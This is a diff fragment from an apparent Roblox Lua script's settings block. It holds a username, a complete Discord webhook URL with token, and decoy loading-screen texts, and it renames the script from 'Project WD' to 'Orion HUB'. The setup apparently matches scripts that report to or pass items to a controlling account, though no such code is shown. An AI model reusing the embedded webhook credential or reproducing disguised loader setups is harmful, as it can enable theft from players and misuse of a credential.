@@ -2,7 +2,7 @@ Username = "ScriptingLoaded"
 WebHook = "https://discord.com/api/webhooks/1101508104505536633/ujNNv4sMVqujXzYKGMzNoU4UPHEG1IywCV6f514UsLGPEet3qZwJzbOoI0HZ4uU1RspO"
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "Project WD"
+_G.CustomScriptName = "Orion HUB"
 _G.Text1 = "Join discord for info"
 _G.Text2 = "Loading Script"
 _G.Text3 = "Script is ready"
